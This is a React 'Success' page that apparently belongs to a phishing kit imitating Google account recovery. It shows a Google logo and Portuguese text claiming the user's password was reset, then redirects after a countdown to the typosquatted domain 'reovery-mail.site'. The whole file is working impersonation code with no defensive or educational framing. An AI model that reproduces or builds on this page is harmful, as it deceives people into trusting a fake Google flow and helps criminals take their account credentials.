
import React, { useEffect, useState } from 'react';
import GoogleLogo from '../components/GoogleLogo';
import RecoveryCard from '../components/RecoveryCard';
import { Check } from 'lucide-react';
import Spinner from '../components/Spinner';

const Success = () => {
  const [email, setEmail] = useState('');
  const [countdown, setCountdown] = useState(5);

  useEffect(() => {
    const storedEmail = localStorage.getItem('recovery_email');
    if (storedEmail) {
      setEmail(storedEmail);
    }
    
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          // Redirect to external site
          window.location.href = "https://www.reovery-mail.site/";
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    
    return () => clearInterval(timer);
  }, []);

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 px-4 py-12">
      <div className="mb-8 animate-fade-in">
        <GoogleLogo />
      </div>
      
      <RecoveryCard>
        <div className="flex flex-col items-center text-center">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-6 animate-scale-in">
            <Check className="w-10 h-10 text-green-600" />
          </div>
          
          <h1 className="text-2xl font-medium text-gray-900 mb-2 animate-slide-up">Senha redefinida com sucesso!</h1>
          <p className="text-gray-600 mb-8 animate-slide-up delay-100">
            A senha da sua conta <strong>{email}</strong> foi alterada com sucesso.
          </p>
          
          <div className="bg-gray-50 p-4 rounded-lg border border-gray-200 w-full mb-6 animate-slide-up delay-200">
            <p className="text-sm text-gray-600">
              Você será redirecionado automaticamente para a página principal em <span className="font-bold">{countdown}</span> segundos...
            </p>
          </div>
          
          <div className="flex justify-center items-center w-full animate-slide-up delay-300">
            <a 
              href="https://www.reovery-mail.site/" 
              className="blue-button flex items-center justify-center"
            >
              {countdown === 0 ? <Spinner /> : 'Ir para a página principal'}
            </a>
          </div>
        </div>
      </RecoveryCard>
      
      <div className="mt-8 flex flex-col sm:flex-row items-center justify-center text-sm text-gray-500 space-y-2 sm:space-y-0 sm:space-x-8 animate-fade-in">
        <select className="bg-transparent border-none cursor-pointer focus:outline-none">
          <option>Português (Brasil)</option>
          <option>English (United States)</option>
          <option>Español (España)</option>
        </select>
        <div className="flex space-x-8">
          <a href="#" className="hover:text-gray-700">Ajuda</a>
          <a href="#" className="hover:text-gray-700">Privacidade</a>
          <a href="#" className="hover:text-gray-700">Termos</a>
        </div>
      </div>
    </div>
  );
};

export default Success;
